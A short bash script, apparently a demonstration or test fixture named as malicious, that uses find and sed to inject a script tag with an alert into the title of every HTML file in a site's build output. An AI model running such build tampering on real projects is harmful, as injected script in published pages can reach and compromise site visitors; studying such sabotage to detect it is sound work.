# bootstrap-malicious.sh
#!/bin/bash


# Sabotage: Injecting a script alert into HTML files in the build output
echo "💥 Modifying build output"
find public/ -name "*.html" -exec sed -i 's|<title>.*</title>|<title>Modified Title</title><script>alert("Injected Script!");</script>|g' {} \;
